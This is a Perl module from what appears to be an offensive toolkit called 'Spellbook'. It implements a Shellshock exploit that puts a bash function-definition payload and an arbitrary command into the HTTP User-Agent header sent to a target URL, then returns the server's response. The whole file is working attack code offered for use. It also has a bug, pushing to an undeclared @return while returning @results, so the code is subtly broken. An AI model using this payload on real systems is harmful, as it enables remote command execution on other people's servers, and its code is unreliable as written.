package Spellbook::Exploits::Shellshock {
    use strict;
    use warnings;
    use LWP::UserAgent;

    sub new {
        my ($self, $target, $parameter) = @_;

        my @results = ();

        if ($target) {
            my $ua = LWP::UserAgent -> new(
                agent => "() { :; }; echo; echo; /bin/bash -c '$parameter'"
            );

            my $request = $ua -> get($target);

            if ($request -> code() == 200) {
                push @return, $request -> content();
            }
        }

        return @results;
    }
}

1;